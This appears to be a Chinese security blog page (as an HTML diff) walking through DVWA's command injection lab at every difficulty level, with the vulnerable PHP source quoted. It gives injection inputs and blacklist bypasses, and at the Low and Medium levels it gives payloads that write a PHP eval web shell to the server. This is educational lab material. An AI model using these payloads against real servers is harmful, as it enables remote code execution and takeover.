@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DVWA 靶场 Command Injection 全难度教程（附带代码分析） - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=渗透测试" class="tag tag-orange">#渗透测试</a>
+    <a href="../tags/list.html?tag=DVWA" class="tag tag-cyan">#DVWA</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2026 // 05 / 27</div>
+  <div class="post-title">DVWA 靶场 Command Injection 全难度教程（附带代码分析）</div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</span>
+    <span class="post-tag" style="background:#ff6b3522;color:#ff6b35;border:1px solid #ff6b3544">渗透测试</span>
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">DVWA</span>
+    <span class="post-tag" style="background:#2ea44f22;color:#2ea44f;border:1px solid #2ea44f44">命令注入</span>
+  </div>
+</div>
+
+<div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+<nav class="post-toc">
+  <span class="post-toc-title">// 目录</span>
+  <ul>
+    <li class="toc-h4"><a href="#principle">Command Execution 原理</a></li>
+    <li class="toc-h4"><a href="#low">Low 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#low-detect">漏洞判断</a></li>
+        <li class="toc-h5"><a href="#low-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#low-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#medium">Medium 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#medium-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#medium-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#high">High 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#high-exploit">漏洞利用</a></li>
+        <li class="toc-h5"><a href="#high-code">代码分析</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#impossible">Impossible 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#impossible-code">代码分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+<h4 id="principle">Command Execution 原理</h4>
+
+<p>命令执行漏洞（Command Injection）是指 Web 应用程序对用户输入的命令检测不足，导致攻击者可以在服务器上执行任意系统命令。</p>
+
+<p>常用的命令连接符如下：</p>
+
+<table>
+  <thead>
+    <tr><th>连接符</th><th>作用</th><th>适用范围</th></tr>
+  </thead>
+  <tbody>
+    <tr><td><code>cmd1 &amp; cmd2</code></td><td>无论 1 是否成功，2 都将执行</td><td>Windows / Linux</td></tr>
+    <tr><td><code>cmd1 | cmd2</code></td><td>无论 1 是否成功，2 都将执行</td><td>Windows / Linux</td></tr>
+    <tr><td><code>cmd1 ; cmd2</code></td><td>无论 1 是否成功，2 都将执行</td><td>Linux</td></tr>
+    <tr><td><code>cmd1 || cmd2</code></td><td>仅在 1 执行失败后执行 2</td><td>Linux</td></tr>
+    <tr><td><code>cmd1 &amp;&amp; cmd2</code></td><td>仅在 1 执行成功后执行 2</td><td>Linux</td></tr>
+  </tbody>
+</table>
+
+<h4 id="low">Low 难度</h4>
+
+<h5 id="low-detect">漏洞判断</h5>
+
+<p>页面直接提示输入 IP 地址，输入本地回环地址看看：</p>
+
+<p><img src="../assets/ce_image001.png" alt="" style="max-width:100%"></p>
+<p><img src="../assets/ce_image002.png" alt="" style="max-width:100%"></p>
+
+<p>使用不同的命令连接符尝试注入：</p>
+
+<pre><code>127.0.0.1 &amp; whoami</code></pre>
+<p><img src="../assets/ce_image003.png" alt="" style="max-width:100%"></p>
+
+<pre><code>127.0.0.1 | whoami</code></pre>
+<p><img src="../assets/ce_image004.png" alt="" style="max-width:100%"></p>
+
+<pre><code>127.0.0.1 ; whoami</code></pre>
+<p><img src="../assets/ce_image005.png" alt="" style="max-width:100%"></p>
+
+<pre><code>0.0.0.1 || whoami</code></pre>
+<p><img src="../assets/ce_image006.png" alt="" style="max-width:100%"></p>
+
+<pre><code>127.0.0.1 &amp;&amp; whoami</code></pre>
+<p><img src="../assets/ce_image007.png" alt="" style="max-width:100%"></p>
+
+<p>小技巧：ping 不能 ping 不合法的 IP，输入不合法 IP 可以看到不同的回显结果。</p>
+
+<h5 id="low-exploit">漏洞利用</h5>
+
+<p>利用 echo 直接写入一句话木马：</p>
+
+<pre><code>127.0.0.1 &amp; echo '&lt;?php @eval($_POST["password"]);?&gt;'&gt;shell.php</code></pre>
+<p><img src="../assets/ce_image008.png" alt="" style="max-width:100%"></p>
+<p>没有回显是正常情况，直接访问写入的文件名即可：</p>
+<p><img src="../assets/ce_image009.png" alt="" style="max-width:100%"></p>
+<p>使用蚁剑连接，密码为 password：</p>
+<p><img src="../assets/ce_image010.png" alt="" style="max-width:100%"></p>
+<p><img src="../assets/ce_image011.png" alt="" style="max-width:100%"></p>
+
+<h5 id="low-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'submit' ] ) ) {
+
+    $target = $_REQUEST[ 'ip' ];
+
+    // Determine OS and execute the ping command.
+    if (stristr(php_uname('s'), 'Windows NT')) { 
+    
+        $cmd = shell_exec( 'ping  ' . $target );
+        echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;';
+        
+    } else { 
+    
+        $cmd = shell_exec( 'ping  -c 3 ' . $target );
+        echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;';
+        
+    }
+    
+}
+?&gt;</code></pre>
+
+<p>可以发现此处没有做任何过滤，用户输入直接拼接到系统命令中执行。</p>
+
+<h4 id="medium">Medium 难度</h4>
+
+<h5 id="medium-exploit">漏洞利用</h5>
+
+<p>Medium 级别过滤了 <code>&amp;&amp;</code> 和 <code>;</code>，但 <code>&amp;</code> 和 <code>|</code> 仍然可用：</p>
+
+<pre><code>127.0.0.1&amp;echo '&lt;?php @eval($_POST["password"]);?&gt;'&gt;1.php</code></pre>
+<p><img src="../assets/ce_image012.png" alt="" style="max-width:100%"></p>
+<p><img src="../assets/ce_image013.png" alt="" style="max-width:100%"></p>
+<p><img src="../assets/ce_image014.png" alt="" style="max-width:100%"></p>
+<p><img src="../assets/ce_image015.png" alt="" style="max-width:100%"></p>
+
+<h5 id="medium-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'submit'] ) ) {
+
+    $target = $_REQUEST[ 'ip' ];
+
+    // Remove any of the charactars in the array (blacklist).
+    $substitutions = array(
+        '&amp;&amp;' =&gt; '',
+        ';' =&gt; '',
+    );
+
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+    
+    // Determine OS and execute the ping command.
+    if (stristr(php_uname('s'), 'Windows NT')) { 
+    
+        $cmd = shell_exec( 'ping  ' . $target );
+        echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;';
+        
+    } else { 
+    
+        $cmd = shell_exec( 'ping  -c 3 ' . $target );
+        echo '&lt;pre&gt;'.$cmd.'&lt;/pre&gt;';
+        
+    }
+}
+
+?&gt;</code></pre>
+
+<p>黑名单只过滤了 <code>&amp;&amp;</code> 和 <code>;</code>，使用 <code>&amp;</code> 或 <code>|</code> 即可绕过。</p>
+
+<h4 id="high">High 难度</h4>
+
+<h5 id="high-exploit">漏洞利用</h5>
+
+<pre><code>127.0.0.1|whoami</code></pre>
+<p><img src="../assets/ce_image016.png" alt="" style="max-width:100%"></p>
+<p>注意此靶场如果在 Windows 上搭建会有显示问题。High 级别过滤了 <code>()</code>，只能通过反弹 shell 或其他方式利用。</p>
+
+<h5 id="high-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Get input
+    $target = trim($_REQUEST[ 'ip' ]);
+
+    // Set blacklist
+    $substitutions = array(
+        '&amp;'  =&gt; '',
+        ';'  =&gt; '',
+        '| ' =&gt; '',
+        '-'  =&gt; '',
+        '$'  =&gt; '',
+        '('  =&gt; '',
+        ')'  =&gt; '',
+        '`'  =&gt; '',
+        '||' =&gt; '',
+    );
+
+    // Remove any of the charactars in the array (blacklist).
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+    // Determine OS and execute the ping command.
+    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+        // Windows
+        $cmd = shell_exec( 'ping  ' . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+    }
+
+    // Feedback for the end user
+    echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+}
+
+?&gt;</code></pre>
+
+<p>注意 <code>| </code>（竖线后跟空格）是黑名单条目，但 <code>|</code>（竖线无空格）未被过滤。这是开发时的疏漏。</p>
+
+<h4 id="impossible">Impossible 难度</h4>
+
+<h5 id="impossible-code">代码分析</h5>
+
+<p>此级别理论上无漏洞：</p>
+
+<pre><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+    $target = stripslashes( $target );
+
+    // Split the IP into 4 octects
+    $octet = explode( ".", $target );
+
+    // Check IF each octet is an integer
+    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {
+        // If all 4 octets are int's put the IP back together.
+        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+
+        // Determine OS and execute the ping command.
+        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+            // Windows
+            $cmd = shell_exec( 'ping  ' . $target );
+        }
+        else {
+            // *nix
+            $cmd = shell_exec( 'ping  -c 4 ' . $target );
+        }
+
+        // Feedback for the end user
+        echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+    }
+    else {
+        // Ops. Let the user name theres a mistake
+        echo '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;';
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+
+<p>代码将用户输入按 <code>.</code> 拆分为 4 段，分别检查是否为数字，然后重新拼接成 IP 再执行 ping 命令。用户输入完全被拆解重组，没有注入系统命令的空间。同时加入了 Anti-CSRF Token 防护。</p>
+
+</div>
+
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const html = document.documentElement;
+const themeBtn = document.getElementById('themeToggle');
+const saved = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', saved);
+themeBtn.textContent = saved === 'dark' ? '☽' : '☀';
+themeBtn.addEventListener('click', () => {
+  const cur = html.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  localStorage.setItem('theme', next);
+  themeBtn.textContent = next === 'dark' ? '☽' : '☀';
+});
+const topBtn = document.getElementById('backToTop');
+topBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+window.addEventListener('scroll', () => topBtn.classList.toggle('show', window.scrollY > 300), { passive: true });
+
+/* sticky nav */
+const navSentinel = document.getElementById('navSentinel');
+const navWrap = document.getElementById('navWrap');
+let navSpacer = null;
+const navObs = new IntersectionObserver(([e]) => {
+  const stuck = !e.isIntersecting;
+  navWrap.classList.toggle('fixed', stuck);
+  if (stuck && !navSpacer) {
+    navSpacer = document.createElement('div');
+    navSpacer.style.height = navWrap.offsetHeight + 'px';
+    navWrap.parentNode.insertBefore(navSpacer, navWrap.nextSibling);
+  } else if (!stuck && navSpacer) {
+    navSpacer.remove(); navSpacer = null;
+  }
+}, { threshold: [0] });
+navObs.observe(navSentinel);
+
+/* TOC active highlight */
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+/* code block header bar */
+document.querySelectorAll('.post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'code-wrapper';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'code-header';
+
+  const info = document.createElement('span');
+  info.className = 'code-header-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'code-header-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'code-btn code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'code-btn code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+</body>
+</html>
